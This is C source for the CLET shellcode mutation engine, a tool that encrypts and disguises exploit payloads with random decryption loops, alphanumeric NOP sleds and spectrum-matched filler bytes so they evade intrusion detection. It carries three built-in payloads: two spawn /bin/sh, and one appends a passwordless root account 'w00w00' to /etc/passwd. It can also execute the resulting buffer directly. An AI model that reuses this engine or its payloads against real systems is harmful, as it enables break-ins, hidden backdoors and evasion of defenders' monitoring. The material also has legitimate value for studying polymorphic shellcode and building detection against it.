/*-------------------------------------------------------------------------
 *  --------------------------------------
 *  | The CLET shellcode mutation engine | 
 *  --------------------------------------
 *     by CLET TEAM:
 *
 *     theo detristan, tyll ulenspiegel,
 *     mynheer superbus von underduk, yann malcom 
 *
 *   sam jun  7 14:18:31 CEST 2003
 *------------------------------------------------------------------------*/



#include <stdio.h>
#include <stdlib.h>
#include "../hdr/types.h"
#include <unistd.h>

#define MAXGENSIZE 200

/* Version */
#define Version "1.0.0"

/* Some predefined shellcode. */
/*Small shellcode d/l on Packetstorm*/
unsigned char shellcode_init_1[]=
    "\x6a\x0b"                      /* push   0xb */
    "\x58"                          /* pop    eax */
    "\x31\xf6"                      /* xor    esi,esi */
    "\x56"                          /* push   esi */
    "\x68\x2f\x2f\x73\x68"          /* push   0x68732f2f */
    "\x68\x2f\x62\x69\x6e"          /* push   0x6e69622f */
    "\x89\xe3"                      /* mov    ebx,esp */
    "\x31\xc9"                      /* xor    ecx,ecx */
    "\x89\xca"                      /* mov    edx,ecx */
    "\xcd\x80";                      /* int    0x80 */
/*
"\x6A\x68\x68\x2F\x62\x61\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2"
"\x52\x53\x89\xE1\x6A\x0B\x58\xCD\x80\x31\xDB\x31\xC0\x40\xCD\x80";
*/

/*Aleph One Shellcode*/
//echo for the lulz
unsigned char shellcode_init_2[]=
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x14\x00"
"\x00\x00\x65\x63\x68\x6f\x20\x27\x66\x6f\x72\x20\x74\x68\x65"
"\x20\x6c\x75\x6c\x7a\x27\x00\x56\x57\x48\x89\xe6\x0f\x05";
/*
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
//"\x90\x90\x90"
*/


/* w00wOO code don't use -e -E 3 in root ;) */
unsigned char shellcode_init_3[]=
"\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35\x01\xfb"
"\x30\xc0\x88\x43\x0b\x31\xc9\x66\xb9\x41\x04\x31\xd2\x66\xba\xa4"
"\x01\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x41\x01\xf9\x31"
"\xd2\xb2\x1f\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f"
"\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x01\x77\x30\x30\x77\x30"
"\x30\x3a\x3a\x30\x3a\x30\x3a\x77\x30\x77\x30\x77\x21\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a";



/* The final buffer. */
unsigned char *final;

/* Global variable which contains arguments. */
unsigned char dump_arg=0;
unsigned char exec_arg=0; 
unsigned int Nnop_arg=0;
unsigned char ame_arg=0;
unsigned char C_form_arg=0;
unsigned char Analyse_arg=0;
unsigned Shellcode_from_file_arg=0;
char *SpecFile="SpecDefault.dat";
unsigned int Ncram_bytes=0;
unsigned int Nadd_bytes=0;
unsigned int Ncram_add_bytes=0;
unsigned char Embeded_shellcode_arg=0;
unsigned char equalize=0;
unsigned char cramadapted=0;
unsigned char *add="\xFF\xFF\xFF\xFF";

int test_exec(char *);                //execute the buffer.
void usage(char *);                   //display how to use this generator.
void print_shell(unsigned char *);    //display a buffer in C form.
void print_inst(p_inst);              //display pseudo-instruction.
void r2reg(int );                     //convert from /i[dw] to the reg name.

int test_exec(char *sc)
{ 
  void (*func)()=(void *) sc;
  func();
}

void r2reg(int reg)
{
    switch(reg)
    {
    case 0:
            fprintf(stderr,"%s","\%eax");
            break;
    case 1:
            fprintf(stderr,"%s","\%ecx");
            break;
    case 2:
            fprintf(stderr,"%s","\%edx");
            break;
    case 3:
            fprintf(stderr,"%s","\%ebx");
            break;
    case 4:
            fprintf(stderr,"%s","\%esp");
            break;
    case 5:
            fprintf(stderr,"%s","\%ebp");
            break;
    case 6:
            fprintf(stderr,"%s","\%esi");
            break;
    case 7:
            fprintf(stderr,"%s","\%edi");
            break;
    }
}


void usage(char *prog)
{
  fprintf(stderr,
    "\033[1;30m"
   "_________________________________________________________________________\n"
   "                                                                        \n"
   "\033[0;31m"
   " The CLET shellcode mutation engine \n" 
   "  by CLET TEAM:\n"
   "     Theo Detristan, Tyll Ulenspiegel,\n"
   "     Mynheer Superbus Von Underduk, Yann Malcom\n" 
   "\033[1;30m"
   "_________________________________________________________________________\n"
   "\033[0;31m"
   "\n"
   "   Don't use it to enter systems, use it to understand systems.\n"
   "                                                                     \n"
   "   Version "Version"\n"
   " \n"
   "\033[1;30m"
   "   Syntax : \n"
   "\033[0;31m"
   "      %s \n"
   "           -n nnop : generate nnop NOP. \n"
   "           -a      : use american english dictonnary to generate NOP. \n"
   "           -c      : print C form of the buffer.\n"
   "           -i nint : decryption routine has nint instructions (default is 5) \n"
   "           -f file : spectral file used to polymorph.\n"
   "           -b ncra : generate ncra cramming bytes using spectrum or not\n"
   "           -B      : cramming bytes zone is adapted to beginning\n"
   "           -t      : number of bytes generated is a multiple of 4\n"
   "           -x XXXX : XXXX is the address for the address zone\n"
   "                     FE011EC9 for instance\n" 
   "           -z nadd : generate address zone of nadd*4 bytes\n"
   "           -e      : execute shellcode. \n"
   "           -d      : dump shellcode to stdout.\n"
   "           -s      : spectral analysis.\n"
   "           -S file : load shellcode from file.\n"
   "           -E [1-3]: load an embeded shellcode.\n"
   "           -h      : display this message.\n"
   "\033[0m\n"
    ,prog);
}  

void print_shell_n(unsigned char shellcode[])
{
  
  int i=0;
 
  
  while(shellcode[i]!='\0')
    {
      printf("\\x%.2X",shellcode[i]);
      if(!((i+1)%4)) printf("\n");
      i++;
    }
  printf("\n");
  
}

void print_shell(unsigned char shellcode[])
{
  
  int i=0;
 
  
  while(shellcode[i]!='\0')
    {
      fprintf(stderr,"\\x%.2X",shellcode[i]);
      if(!((i+1)%4)) fprintf(stderr,"\n");
      i++;
    }
  fprintf(stderr,"\n");
  
}

void print_inst(p_inst p)
{
  switch(p.instruct)
    {
    case '\x00': fprintf (stderr,"   XOR %X\n",p.arg); break;
    case '\x01': fprintf (stderr,"   ADD %X\n",p.arg); break;
    case '\x02': fprintf (stderr,"   SUB %X\n",p.arg); break;
    case '\x03': fprintf (stderr,"   ROR %X\n",p.arg); break;
    case '\x04': fprintf (stderr,"   ROL %X\n",p.arg); break;
    }
}

unsigned char *get_from_file(char *nom)
{
  FILE *file;
  unsigned char *c;
  int i = 0;
  int size = 0;
  if( file = fopen(nom,"r"))
    {
      while(getc(file)!=EOF)
	i++;
      size = i;
      rewind(file);
      c = (unsigned char *) malloc(i*sizeof(char)+2);
      i=0;
      while(i<=size)
	{
	  c[i++]=getc(file);
	}
      fclose(file);
    }
  else
    {
      printf("Arg : Error in file opening, exiting ...\n");
      exit(1);
    }
  
  return c;
}


/********************** 
 * The main fonction .*
 **********************/
int main(int argc, char **argv)
{
  p_inst *p;
  int SIZE_p_inst;
  unsigned char *final;
  unsigned char *gen_hea;
  int size_header;
  int i;
  int j;
  int size_shellcode_init;
  int size_shellcode;
  int work_reg;
  int left_reg;
  int addr_reg;
  char *shellcode;
  int option;
  char * options_list="asS:ceBdhtx:z:b:f:n:i:E:";
  char *NOP;
  char *caddy="\x43\x46\x45\x4A\x42\x4F";
  unsigned int *analysis;
  unsigned char *CRAMBYTES;
  unsigned int **cramtab;
  unsigned char *ADDCRAMBYTES;
  unsigned int **ADDcramtab;
  unsigned char *add_zone;
  unsigned char *completenop="\x90\x90\x90\x90";

  unsigned char *shellcode_init=shellcode_init_1;
  
  int temp;
    

  /* Parsing arguments*/

  opterr=0; /* No error message*/

  /* default arg */
  SIZE_p_inst=5;
  
  while((option= getopt(argc,argv,options_list))!= -1)
    {
      switch(option){
      case 'a':
	ame_arg=1;
	break;
      case 'c':
	C_form_arg=1;
	break;
      case 'd':
	dump_arg=1;
	break;   
      case 'e':
	exec_arg=1;
	break;
      case 'E':
	if(Shellcode_from_file_arg!=0)
    {
        printf("Incompatible with -S option.\n");
        exit(1);
    }
      Embeded_shellcode_arg=atoi(optarg);
	break;
      case 'b':
	Ncram_bytes=atoi(optarg);
	break;
      case 'B':
	cramadapted=1;
	break;
      case 'n':
	Nnop_arg=atoi(optarg);
	break;
      case 'x':
	add=(unsigned char*)ch2add(optarg);
	break;
      case 'z':
	Nadd_bytes=atoi(optarg);
	break;
      case 'i':
	SIZE_p_inst=atoi(optarg);
	break;
      case 's':
	Analyse_arg=1;
	break;
      case 'S':
	if(Embeded_shellcode_arg!=0)
	  {
	    printf("Incompatible with -E option.\n");
	    exit(1);
	  }
	Shellcode_from_file_arg=1;
	shellcode_init=get_from_file(optarg);
	break;
      case 'f':
	SpecFile=optarg;
	break;
      case 't':
	equalize=1;
	break;
      case 'h':
      default:
	usage(argv[0]);
	exit(1);
      }
    }
  /* Loading the embeded shellcode in case of non-specific shellcode.*/
  switch(Embeded_shellcode_arg){
  case 0:
    break;
  case 1:
    shellcode_init = shellcode_init_1;
    break;
  case 2:
    shellcode_init = shellcode_init_2;
    break;
  case 3:
    shellcode_init = shellcode_init_3;
    break;
  }

  p=(p_inst *)malloc(SIZE_p_inst*sizeof(p_inst));
  
  // correction of Nadd_bytes

  Nadd_bytes=Nadd_bytes*strlen(add);

  /* Getting shellcode size divisible by 4 */
  size_shellcode_init = strlen(shellcode_init);
  size_shellcode = size_shellcode_init;
  while(size_shellcode%4!=0)
         size_shellcode++;

  shellcode = (char *)  malloc((size_shellcode+1)*sizeof(char));
  strncpy(shellcode,shellcode_init,size_shellcode_init);
  strncpy(shellcode+size_shellcode_init,completenop,
	  size_shellcode-size_shellcode_init);

  /* Generating the decryption instruction */
  fprintf(stderr,"\033[0;34m[+] Generating decryption loop : \033[0m\n");
  temp=0; // how many steps for generating a loop without zeros?
  do
    {
      if (temp==1) fprintf(stderr,"\033[0;31mOk we've zeros, Generating another loop\033[0;0m\n");
      gen_decrypt(SIZE_p_inst,p);
      for (i=0;i<SIZE_p_inst;i++)
	{
	  print_inst(p[i]);
	}

      temp=1;
    }
  while(is_there_zero(shellcode,SIZE_p_inst,p));
  fprintf(stderr,"\033[0;32mdone\033[0m\n\n");
  
  /* Generating Alpha NOP */
  if(Nnop_arg!=0)
    {
      fprintf(stderr,"\033[0;34m[+] Generating %u bytes of  Alpha NOP : \033[0m\n",Nnop_arg);
      NOP = (char *) gen_nop(Nnop_arg);
      fprintf(stderr,"NOP : %s \n",NOP);
      fprintf(stderr,"\033[0;32mdone\033[0m\n\n");
    }


  /* Choosing which regs will be use */
  fprintf(stderr,"\033[0;34m[+] Choosing used regs : \033[0m\n");
  work_reg=my_random(0,4);
  while((left_reg=my_random(0,4))==work_reg);
  while((addr_reg=my_random(0,4))==work_reg||addr_reg==left_reg);
  fprintf(stderr,"   work_reg : ");
  r2reg(work_reg);
  fprintf(stderr,"\n");
  
  fprintf(stderr,"   left_reg : ");
  r2reg(left_reg);
  fprintf(stderr,"\n");
  
  fprintf(stderr,"   addr_reg : ");
  r2reg(addr_reg);
  fprintf(stderr,"\n");

  fprintf(stderr,"\033[0;32mdone\033[0m\n\n");
  

  /* Generating the decryption header */
  fprintf(stderr,"\033[0;34m[+] Generating decryption header : \033[0m\n");
  size_header=gen_header(0,work_reg,left_reg,addr_reg,p,SIZE_p_inst,
			 &gen_hea,100,100,strlen(shellcode),100,100,100,100);
  fprintf(stderr,"\033[0;32mdone\033[0m\n\n");

  /* If option -t is up */
  /* Calculating cramming bytes to add to obtain a number of bytes */
  /* multiple of 4 */

  if (equalize!=0)
    {
      Ncram_add_bytes=(4-(size_header+size_shellcode+Nnop_arg+Ncram_bytes)%4);
    }

  /* Allocating the final buffer */
  //final=(unsigned char *)malloc((size_header+size_shellcode+Nnop_arg+Ncram_bytes+Ncram_add_bytes+1)*sizeof(char));
  final=(unsigned char *)malloc((size_header+size_shellcode+Nnop_arg+Ncram_bytes+Ncram_add_bytes+Nadd_bytes+1)*sizeof(char)); 
  
  /* Crypting the shellcode */
  fprintf(stderr,"\033[0;34m[+] Crypting shellcode : \033[0m\n");
  crypt_shell(shellcode,SIZE_p_inst,p);
  fprintf(stderr,"\033[0;32mdone\033[0m\n\n");

  /* Is there 0x00 in crypted shellcode ? */
  if(strlen(shellcode)!=size_shellcode)
  {
      fprintf(stderr,"\033[0;31mThere is 0x00 in the crypted shellcode.\033[0m\n");
      fprintf(stderr,"\033[0;31mAborting ...\033[0m\n");
      exit(1);
  }

  /* Generating the cramming_bytes */
  if (Ncram_bytes!=0)
    {
      fprintf(stderr,"\033[0;34m[+] Generating %d cramming bytes \033[0m\n",Ncram_bytes);
      if((strncmp(SpecFile,"SpecDefault.dat",15))==0)
	  fprintf(stderr,"\033[0;34m[+] Using no spectral file \033[0m\n");	  
      else
	  fprintf(stderr,"\033[0;34m[+] Using %s \033[0m\n",SpecFile);	  
      cramtab=(unsigned int **)generate_cramming_tab(SpecFile);
      if (cramadapted!=0)
      {
	fprintf(stderr,"\033[0;34m[+] Adapting to beginning\033[0m\n");
	modify_cramtab(cramtab,gen_hea,size_header,NOP,Nnop_arg,
		       shellcode,size_shellcode,
		       size_header+Nnop_arg+size_shellcode+Ncram_bytes);
      }
      CRAMBYTES=(unsigned char *)malloc(Ncram_bytes*sizeof(unsigned char));
      generate_cramming_code(cramtab,Ncram_bytes,CRAMBYTES);
      fprintf(stderr,"\033[0;32mdone\033[0m\n\n");      
    }
  
  /* if add zone is asked, complete with cramming bytes */
  if (equalize!=0)
    {
      fprintf(stderr,"\033[0;34m[+] Generating %d adding cramming bytes to equalize \033[0m\n",Ncram_add_bytes);
      if((strncmp(SpecFile,"SpecDefault.dat",15))==0)
	  fprintf(stderr,"\033[0;34m[+] Using no spectral file \033[0m\n");	  
      else
	  fprintf(stderr,"\033[0;34m[+] Using %s \033[0m\n",SpecFile);
      ADDcramtab=(unsigned int **)generate_cramming_tab(SpecFile);
      ADDCRAMBYTES=(unsigned char *)malloc(Ncram_add_bytes*sizeof(unsigned char));
      generate_cramming_code(ADDcramtab,Ncram_add_bytes,ADDCRAMBYTES); 
      fprintf(stderr,"\033[0;32mdone\033[0m\n\n");       
    }


  
  

  /* Putting the header and the crypted shellcode in the buffer */
  fprintf(stderr,"\033[0;34m[+] Assembling buffer : \033[0m\n");
  if(Nnop_arg!=0)
    {
      strncpy(final,NOP,Nnop_arg);
    }
  strncpy(final+Nnop_arg,gen_hea,size_header);
  strncpy(final+Nnop_arg+size_header ,shellcode,size_shellcode);
  if(Ncram_bytes!=0)
    {
      strncpy(final+Nnop_arg+size_header+size_shellcode,
	      CRAMBYTES,Ncram_bytes);
    }
  if(equalize!=0)
    {
      strncpy(final+Nnop_arg+size_header+size_shellcode+Ncram_bytes,
	      ADDCRAMBYTES,Ncram_add_bytes);
    }

  // adress zone

  if(Nadd_bytes!=0)
    {
      add_zone=(unsigned char*)gen_add(add,Nadd_bytes,add_zone);
      strncpy(final+Nnop_arg+size_header+size_shellcode+Ncram_bytes
	      +Ncram_add_bytes,add_zone,Nadd_bytes);
    }
	      

  final[size_header+Nnop_arg+size_shellcode+Ncram_bytes
  	+Ncram_add_bytes+Nadd_bytes]='\x0';
  fprintf(stderr,"   buffer length : %u\n",strlen(final));
  fprintf(stderr,"\033[0;32mdone\033[0m\n\n");

  /* Displaying the buffer in C Form */
  if(C_form_arg)
  {
  fprintf(stderr,"\033[0;33mAssembled version :\033[0m\n");
  print_shell(final);
  print_shell_n(final);
  }
  //  decrypt_shell(shellcode,SIZE_p_inst,p);
  //  print_shell(shellcode);
  
  /* if -c then print buffer to stderr */
  if(dump_arg==1)
    printf("%s",final);

  /* if -a then print the repartition */
  if(Analyse_arg)
  {
          fprintf(stderr,"\033[0;33mPrinting Analysis : ...\033[0m\n");
          analysis = (int *) analyse((unsigned char *)final);
          fprintf(stderr,"Char |  Number      "
                         "Char |  Number      "
                         "Char |  Number      "
                         "Char |  Number\n"
                         "---------------    "
                         "---------------    "
                         "---------------    "
                         "---------------\n");
          for(j=0;j<64;j++)
          {
            if(analysis[j]!=0)
                    fprintf(stderr," %.2X  :  \033[0;31m%.4u\033[0m        ",
                            j,analysis[j]);
            else 
                    fprintf(stderr," %.2X  :  %.4u        ",
                            j,analysis[j]);

            if(analysis[j+64]!=0)
                    fprintf(stderr," %.2X  :  \033[0;31m%.4u\033[0m        ",
                            j+64,analysis[j+64]);
            else
                    fprintf(stderr," %.2X  :  %.4u        ",
                            j+64,analysis[j+64]);

            if(analysis[j+128]!=0)
                    fprintf(stderr," %.2X  :  \033[0;31m%.4u\033[0m        ",
                            j+128,analysis[j+128]);
            else
                    fprintf(stderr," %.2X  :  %.4u        ",
                            j+128,analysis[j+128]);

            if(analysis[j+192]!=0)
                    fprintf(stderr," %.2X  :  \033[0;31m%.4u\033[0m       \n",
                            j+192,analysis[j+192]);
            else
                    fprintf(stderr," %.2X  :  %.4u        \n",
                            j+192,analysis[j+192]);
                                    
          }       
  }
  
  /* if -e then try to execute the buffer */
  if(exec_arg)
    {
      fprintf(stderr,"\033[0;33mExecuting buffer : ...\033[0m\n");
      test_exec(final);
    }
  return 0;
} 


